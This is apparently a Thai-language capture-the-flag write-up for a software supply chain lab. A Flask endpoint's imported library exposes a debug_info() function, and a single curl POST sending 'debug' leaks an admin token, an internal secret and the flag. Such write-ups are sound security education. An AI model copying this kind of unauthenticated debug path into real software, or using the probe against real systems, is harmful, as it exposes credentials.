# AS03: Software Supply Chain Failures

Target: http://10.49.x.x:5003   
Flag: `THM{SUPPLY_CH41N_VULN3R4B1L1TY}`

---

## 1. บทนำ

แลปนี้เป็นการฝึกทดสอบช่องโหว่ประเภท `Software Supply Chain Failures`
ซึ่งเกิดจากการที่แอปพลิเคชันมีการพึ่งพา library หรือ component ภายนอกที่ไม่ปลอดภัย  
แม้โค้ดหลักของแอปจะดูปกติ แต่ library ที่ถูกนำมาใช้อาจมีฟังก์ชันที่อันตรายหรือเปิดเผยข้อมูลภายในของระบบได้

---

## 2. ภาพรวมของระบบ

ระบบเป็นเว็บแอปพลิเคชันที่พัฒนาโดยใช้ Flask และมี API สำหรับประมวลผลข้อมูลของผู้ใช้  
โดยมี endpoint ที่สำคัญคือ

- `POST /api/process` สำหรับรับข้อมูลจากผู้ใช้
- ระบบมีการ import library ภายนอกชื่อ `vulnerable_utils.py`

```bash
from vulnerable_utils import process_data, format_output, debug_info
```

library ดังกล่าวไม่ได้มีการตรวจสอบความปลอดภัยก่อนนำมาใช้งาน

---

## 3. การวิเคราะห์โค้ดที่เกี่ยวข้องกับช่องโหว่

จากโค้ดของ endpoint /api/process พบเงื่อนไขดังนี้

```bash
if data == 'debug':
    return jsonify(debug_info())
```

หมายความว่า หากผู้ใช้ส่งค่า `"debug"` เข้ามาในตัวแปร `data` ระบบจะเรียกฟังก์ชัน `debug_info()` จาก library ภายนอกทันทีโดยไม่มีการยืนยันตัวตนหรือการจำกัดสิทธิ์ใดๆ

---

## 4. การทดสอบเรียกใช้งาน Debug Mode

จากเงื่อนไขในโค้ด จึงทดลองเรียก API โดยส่งค่า `data` เป็น `"debug"`
ด้วยคำสั่ง `curl` ดังนี้

```bash
curl -X POST http://10.49.x.x:5003/api/process \
-H "Content-Type: application/json" \
-d '{"data":"debug"}'
```

- -X POST ใช้เรียก API แบบ POST
- -H "Content-Type: application/json" ระบุว่าข้อมูลที่ส่งเป็น JSON
- -d ใช้ส่งข้อมูลไปใน request body

---

## 5. ผลลัพธ์ที่ได้จากระบบ

หลังจากเรียก API ระบบตอบกลับข้อมูล debug ออกมาโดยตรง ดังนี้

```bash
{
    "admin_token": "admin_token_12345",
    "flag": "THM{SUPPLY_CH41N_VULN3R4B1L1TY}",
    "internal_secret": "internal_secret_key_2024",
    "version": "1.2.3"
}
```

จากผลลัพธ์พบว่าระบบเปิดเผยข้อมูลภายในหลายรายการ
รวมถึง flag ซึ่งไม่ควรถูกเปิดให้ผู้ใช้ทั่วไปเข้าถึงได้

---

## 6. Flag ที่ได้

จากข้อมูล debug ที่ระบบแสดง สามารถได้ flag ดังนี้

`THM{SUPPLY_CH41N_VULN3R4B1L1TY}`

---

## 7. สรุปสิ่งที่ได้เรียนรู้

- การใช้ third-party library ที่ไม่ปลอดภัยสามารถนำไปสู่การรั่วไหลของข้อมูลได้
- ฟังก์ชัน debug ที่ถูกทิ้งไว้ใน library อาจกลายเป็นช่องโหว่ร้ายแรง
- แม้โค้ดหลักของแอปจะไม่ได้มี bug โดยตรง แต่ dependency ที่ไม่ถูกตรวจสอบก็สามารถทำให้ระบบถูกโจมตีได้
- การควบคุมการเข้าถึงและการปิด debug mode ในระบบจริงเป็นสิ่งที่สำคัญมาก